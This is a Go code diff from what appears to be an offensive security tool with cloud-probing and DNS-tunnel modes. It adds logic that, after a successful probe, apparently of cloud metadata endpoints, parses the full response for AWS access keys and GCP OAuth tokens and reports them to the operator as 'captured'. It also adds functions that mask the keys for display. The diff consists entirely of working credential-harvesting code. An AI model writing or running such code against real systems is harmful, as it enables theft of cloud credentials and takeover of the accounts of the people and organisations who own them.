@@ -1205,6 +1205,20 @@ func runCloud(conn net.Conn, sess *crypto.Session, c proto.CloudStart) {
 				det = r.Error
 			}
 			send("probe", r.URL, det, ok, false)
+
+			// Auto-extract credentials from a successful probe body so
+			// the operator sees a parsed summary, not raw JSON. The
+			// full body (not the 800-char preview) is what gets parsed
+			// — extractors need the complete response.
+			if !r.OK || r.Body == "" {
+				continue
+			}
+			if creds, err := cloudgo.ExtractAWSCredentials(r.Body); err == nil && creds.AccessKeyID != "" {
+				send("probe-extract", "AWS credentials captured", redactKey(creds.AccessKeyID), true, false)
+			}
+			if tok, err := cloudgo.ExtractGCPToken(r.Body); err == nil && tok.AccessToken != "" {
+				send("probe-extract", "GCP OAuth token captured", redactJWT(tok.AccessToken), true, false)
+			}
 		}
 
 	case "chain":
@@ -2913,4 +2927,22 @@ func runDNSTunnel(conn net.Conn, sess *crypto.Session, d proto.DNSTunnelStart) {
 		Reply:     reply,
 		Done:      true,
 	})
+}
+
+// redactKey masks an AWS access key ID: first 8 chars + "…" + last 4.
+// Keys are 20 chars (AKIA…), so short-enough keys come back unchanged.
+func redactKey(k string) string {
+	if len(k) <= 12 {
+		return k
+	}
+	return k[:8] + "…" + k[len(k)-4:]
+}
+
+// redactJWT masks a JWT-style token: first 20 chars + "…" + last 8.
+// GCP OAuth tokens are long enough that the shape survives masking.
+func redactJWT(t string) string {
+	if len(t) <= 30 {
+		return t
+	}
+	return t[:20] + "…" + t[len(t)-8:]
 }
